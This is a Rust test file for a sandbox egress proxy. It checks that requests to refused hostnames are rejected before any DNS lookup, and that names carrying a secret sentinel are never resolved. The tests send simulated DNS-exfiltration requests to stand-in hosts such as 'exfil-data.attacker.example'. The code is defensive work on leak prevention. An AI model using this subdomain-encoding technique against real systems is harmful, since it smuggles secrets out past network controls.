//! A name the proxy is going to refuse must never reach DNS: the query itself
//! carries the name to whoever answers for its zone, so resolving
//! `<data>.attacker.example` before refusing it would leak `<data>`.
//! Every case drives the explicit listener the way a sandboxed process with
//! `HTTP(S)_PROXY` set would, and counts what the proxy asked its resolver.

use std::io;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::{Arc, Mutex, MutexGuard};
use std::time::Duration;

use async_trait::async_trait;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use trogon_sandbox_contract::{
    AllowRange, DomainPattern, DomainRule, DomainRuleAction, InjectHosts, NetworkPolicy, OpaqueTunnelPolicy, Port,
    SecretName,
};
use trogon_sandbox_egress_proxy::SecretSubstitution;
use trogon_sandbox_egress_proxy::ingress::{ListenAddress, Listener, ProxyToken};
use trogon_sandbox_egress_proxy::resolve::{NameLookup, SsrfFloor, VettingResolver};
use trogon_sandbox_egress_proxy::server::{BoundAddress, ProxyServer};
use trogon_sandbox_egress_proxy::tls_ca::{PermittedDomains, SandboxCa, install_default_crypto_provider};
use trogon_sandbox_protocol::{RealValue, SentinelRegistry};

const TOKEN: &str = "lease-token-value";
const REAL: &str = "sk-fake-REALVALUE-7f3a9c0d2e1b4a65";

type TestResult<T = ()> = Result<T, Box<dyn std::error::Error>>;

fn locked<T>(mutex: &Mutex<T>) -> MutexGuard<'_, T> {
    match mutex.lock() {
        Ok(guard) => guard,
        Err(poisoned) => poisoned.into_inner(),
    }
}

/// Answers every `.test` name with loopback and records each name it is asked.
#[derive(Default)]
struct CountingLookup(Mutex<Vec<String>>);

impl CountingLookup {
    fn asked(&self) -> Vec<String> {
        locked(&self.0).clone()
    }
}

#[async_trait]
impl NameLookup for CountingLookup {
    async fn lookup(&self, name: &str, _port: Port) -> io::Result<Vec<IpAddr>> {
        locked(&self.0).push(name.to_string());
        if name.ends_with(".test") {
            Ok(vec![IpAddr::V4(Ipv4Addr::LOCALHOST)])
        } else {
            // A real resolver would have sent the query by now; refusing to
            // answer keeps the harness offline without hiding that it was asked.
            Err(io::Error::new(io::ErrorKind::NotFound, "offline harness"))
        }
    }
}

/// Accepts connections and answers each with an empty `200`, counting them.
async fn upstream() -> TestResult<(u16, Arc<Mutex<usize>>)> {
    let listener = TcpListener::bind("127.0.0.1:0").await?;
    let port = listener.local_addr()?.port();
    let accepted = Arc::new(Mutex::new(0usize));
    let counter = accepted.clone();
    tokio::spawn(async move {
        while let Ok((mut stream, _)) = listener.accept().await {
            *locked(&counter) += 1;
            tokio::spawn(async move {
                let mut chunk = [0u8; 4096];
                let _ = tokio::time::timeout(Duration::from_millis(300), stream.read(&mut chunk)).await;
                let _ = stream
                    .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                    .await;
                let _ = stream.shutdown().await;
            });
        }
    });
    Ok((port, accepted))
}

struct Harness {
    server: ProxyServer,
    addr: SocketAddr,
    lookup: Arc<CountingLookup>,
    sentinel: String,
}

async fn start(rules: Vec<DomainRule>, allow_ranges: Vec<AllowRange>) -> TestResult<Harness> {
    install_default_crypto_provider();
    let policy = NetworkPolicy::UserDefined {
        rules: rules.clone(),
        allow_ranges,
        deny_ranges: vec![],
        denied_domains: vec![],
        opaque_tunnels: OpaqueTunnelPolicy::Refuse,
        request_rules: vec![],
    };
    let mut registry = SentinelRegistry::new();
    let sentinel = registry.register(
        SecretName::new("api")?,
        RealValue::new(REAL.to_string()),
        InjectHosts::new(vec![DomainPattern::new("inject.test")?])?,
    );
    let lookup = Arc::new(CountingLookup::default());
    let ca = SandboxCa::generate(PermittedDomains::from_rules(&rules)?)?;
    let listener = Listener::bind(&ListenAddress::parse("127.0.0.1:0")).await?;
    let server = ProxyServer::builder(policy, ca)
        .explicit(listener, ProxyToken::new(TOKEN)?)
        .resolver(Arc::new(VettingResolver::new(lookup.clone(), SsrfFloor::system())))
        .secrets(SecretSubstitution::new(Arc::new(registry)))
        .start()?;
    let addr = match server.explicit_addr() {
        Some(BoundAddress::Tcp(addr)) => *addr,
        other => return Err(format!("unexpected listener address {other:?}").into()),
    };
    Ok(Harness {
        server,
        addr,
        lookup,
        sentinel: sentinel.as_str().to_string(),
    })
}

fn auth() -> String {
    format!("Basic {}", STANDARD.encode(format!("sandbox:{TOKEN}")))
}

async fn exchange(proxy: SocketAddr, request: &str) -> TestResult<String> {
    let mut client = TcpStream::connect(proxy).await?;
    client.write_all(request.as_bytes()).await?;
    let mut reply = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(3), client.read_to_end(&mut reply)).await;
    Ok(String::from_utf8_lossy(&reply).into_owned())
}

async fn plain_get(proxy: SocketAddr, authority: &str) -> TestResult<String> {
    exchange(
        proxy,
        &format!(
            "GET http://{authority}/ HTTP/1.1\r\nHost: {authority}\r\nProxy-Authorization: {}\r\nConnection: close\r\n\r\n",
            auth()
        ),
    )
    .await
}

async fn connect(proxy: SocketAddr, authority: &str) -> TestResult<String> {
    exchange(
        proxy,
        &format!(
            "CONNECT {authority} HTTP/1.1\r\nHost: {authority}\r\nProxy-Authorization: {}\r\n\r\n",
            auth()
        ),
    )
    .await
}

fn status(reply: &str) -> &str {
    reply.lines().next().unwrap_or("<no reply>")
}

fn pass_through(domain: &str) -> TestResult<DomainRule> {
    Ok(DomainRule {
        domain: domain.parse()?,
        action: DomainRuleAction::PassThrough,
    })
}

/// Harness case 2b: the policy has an allow range, but only for one address on
/// one port, so no name on another port can be admitted by it. Before the fix
/// the mere presence of an allow range made the proxy resolve every unlisted
/// name before refusing it.
#[tokio::test]
async fn an_unlisted_name_is_refused_without_a_lookup_when_no_allow_range_covers_its_port() -> TestResult {
    let (up, _) = upstream().await?;
    let harness = start(
        vec![pass_through(&format!("allowed.test:{up}"))?],
        vec![AllowRange::new(format!("127.0.0.1:{up}"))?],
    )
    .await?;

    let plain = plain_get(harness.addr, "exfil-data.attacker.example").await?;
    let tunnel = connect(harness.addr, "exfil2-data.attacker.example:443").await?;
    let asked = harness.lookup.asked();
    harness.server.shutdown(Duration::from_millis(200)).await?;

    assert!(status(&plain).contains(" 403 "), "plain reply: {}", status(&plain));
    assert!(status(&tunnel).contains(" 403 "), "CONNECT reply: {}", status(&tunnel));
    assert!(
        asked.iter().all(|name| !name.contains("attacker")),
        "denied names reached DNS: {asked:?}"
    );
    Ok(())
}

/// The same probe with no allow ranges at all, only a domain rule.
#[tokio::test]
async fn an_unlisted_name_is_refused_without_a_lookup_when_the_policy_has_no_allow_range() -> TestResult {
    let harness = start(vec![pass_through("api.allowed.test")?], vec![]).await?;

    let plain = plain_get(harness.addr, "nr-plain-data123.attacker.example").await?;
    let tunnel = connect(harness.addr, "nr-connect-data456.attacker.example:443").await?;
    let asked = harness.lookup.asked();
    harness.server.shutdown(Duration::from_millis(200)).await?;

    assert!(status(&plain).contains(" 403 "), "plain reply: {}", status(&plain));
    assert!(status(&tunnel).contains(" 403 "), "CONNECT reply: {}", status(&tunnel));
    assert!(asked.is_empty(), "denied names reached DNS: {asked:?}");
    Ok(())
}

/// The policy semantics stay: an unlisted name on a port an allow range covers
/// is resolved, and admitted when it lands in the range.
#[tokio::test]
async fn an_unlisted_name_is_still_resolved_and_admitted_when_an_allow_range_covers_its_port() -> TestResult {
    let (up, accepted) = upstream().await?;
    let harness = start(vec![], vec![AllowRange::new(format!("127.0.0.1:{up}"))?]).await?;

    let reply = plain_get(harness.addr, &format!("ranged.test:{up}")).await?;
    let asked = harness.lookup.asked();
    harness.server.shutdown(Duration::from_millis(200)).await?;

    assert!(status(&reply).contains(" 200 "), "reply: {}", status(&reply));
    assert_eq!(asked, vec!["ranged.test".to_string()]);
    assert!(
        *locked(&accepted) >= 1,
        "the admitted request never reached the upstream"
    );
    Ok(())
}

/// A name that carries a secret sentinel is never looked up, whether a rule
/// would allow it or an allow range might, and whether or not its case matches.
#[tokio::test]
async fn a_name_carrying_a_sentinel_is_refused_without_a_lookup() -> TestResult {
    let (up, accepted) = upstream().await?;
    let harness = start(
        vec![pass_through("*.allowed.test")?],
        vec![AllowRange::new(format!("127.0.0.1:{up}"))?],
    )
    .await?;
    let sentinel = harness.sentinel.clone();
    let shouted = sentinel.to_ascii_uppercase();

    let by_rule = plain_get(harness.addr, &format!("{sentinel}.allowed.test")).await?;
    let by_range = plain_get(harness.addr, &format!("x-{sentinel}.attacker.example:{up}")).await?;
    let tunnel = connect(harness.addr, &format!("{shouted}.allowed.test:443")).await?;
    let asked = harness.lookup.asked();
    harness.server.shutdown(Duration::from_millis(200)).await?;

    for reply in [&by_rule, &by_range, &tunnel] {
        assert!(status(reply).contains(" 403 "), "reply: {}", status(reply));
    }
    assert!(asked.is_empty(), "names carrying the sentinel reached DNS: {asked:?}");
    assert_eq!(*locked(&accepted), 0);
    Ok(())
}
